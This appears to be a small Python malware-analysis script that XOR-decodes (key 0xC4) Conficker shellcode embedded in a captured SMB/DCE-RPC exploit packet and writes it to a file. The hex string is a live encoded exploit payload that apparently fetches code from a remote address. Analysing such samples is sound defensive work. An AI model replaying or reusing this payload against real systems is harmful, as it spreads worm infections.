#########################################
# Conflicker - shellcode decryptor utility
# Author : thunderstrike9090
# Description : Conflicker shellcode is one byte XOR'ed with a predefined key '0xC4'
# Usage : python conflicker_shellcode_decryptor.py 
# Ouput : dcr.bin <contains the de-XOR'ed data. Can be viewed in Hex Editors or run 'hexdump -C dcr.bin' on linux
#########################################
import binascii

dce_rpc_stub = "000c298511a1000c29cdbefa080045000340005640008006fe0ac0a8bc02c0a8bc03041901bd14188ddf6027882d5018f716bebd000000000314ff534d4225000000001807c80000000000000000000000000008f80300088000100000c002000000040000000000000000000000005400c0025400020026000040d102005c0050004900500045005c00000000000500000310000000c002000001000000a802000000001f00244015010600000000000000060000004800480044004800480000003101000000000000310100005c0064704b4142657a717a716553474a43596b7075526c506159545675564758475476694f78594178544f52666c48564c424872547a6949596f6b507269656f7a417274764f7a474e5752466856567274484c564e6b704d5a4748546166615a424e54664945e8ffffffffc25f8d4f108031c4416681394d5375f538aec69da04f85ea4f84c84f84d84fc44f9ccc497365c4c4c42cedc4c4c494263c4f38923bd3574702c32cdcc4c4c4f71696964f08a203c5bcea953bb3c096969592963bf33b24699592514f8ff84f88cfbcc70ff73249d077c795e44fd6c717cbc404cb7b040504c3f6c68644fec4b131ff01b0c282ffb5dcb61f4f95e0c717cb73d0b64f85d8c7074fc054c7079a9d07a4664eb2e244680cb1b6a8a9abaac45de7991dacb0b0b4feebebf5fdf6eaf5f2fceaf5fcfceaf6fef6f5fdf5ebbca9beadc44d536f7966494d507444446a616344574d49706154586357435366415258545051586d464657504c41516747766c42437a4b77436653766b6167456857687367474a4a6769525a6155466d4f77626f6c705a52735273744654696674654965476a664164576e7967715341566b75486e67537142494d7957544f756f676756526765625664704575626d7070574d6c49684c6474424e5764666a4f6e6f4848785a68624963696b766358596d5549486e6f4756694a69515a5c002e002e005c002e002e005c004100430056004d004c004700460008040200e216896f454d4f5527f7886f585753505250495149534b464b574f41424d4954525156454f52594b52494c4159434149474a444c474d924a24b69703f537eb6243564d5157565a475a4f000000001f0300000200000000000000020000005c0000000101000000000000"

stub_hex_bytearray = bytearray.fromhex(dce_rpc_stub)

#for h in stub_hex_bytearray:
#	print str(hex(h))
#	dcr = byte ^ 0xc4
#	print str(hex(dcr))

decoded_stub = ''.join(chr(h ^ 0xc4) for h in stub_hex_bytearray)
#print decoded_stub

fh = open("dcr.bin", "wb")
fh.write(decoded_stub)
